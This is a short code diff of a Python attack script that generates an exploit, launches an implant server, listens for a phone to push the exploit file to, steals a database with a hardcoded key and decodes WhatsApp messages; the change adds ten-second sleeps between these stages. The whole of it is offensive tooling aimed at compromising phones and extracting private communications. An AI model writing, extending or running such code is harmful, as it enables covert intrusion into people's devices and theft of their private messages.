@@ -1,4 +1,4 @@
-import http.server, socket, sqlite3, json, requests, datetime, os
+import http.server, socket, sqlite3, json, requests, datetime, os, time
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from Crypto.Cipher import AES
 import gen_exploit
@@ -16,7 +16,6 @@ def prepare_implant():
 def start_implant_server():
     os.system("python3 implant-server.py")
     print("Implant server started on port 8080")
-
 
 def steal_database():
     key = "546869732069732061206b6579313233"
@@ -70,9 +69,13 @@ def connect_to_db(filepath):
 
 if __name__ == "__main__":
     gen_exploit.gen_exploit()
+    time.sleep(10)
     start_implant_server()
+    time.sleep(10)
     listen_for_phone_and_send_exploit_file()
+    time.sleep(10)
     steal_database()
+    time.sleep(10)
     decode_whatsapp_messages()
  
    
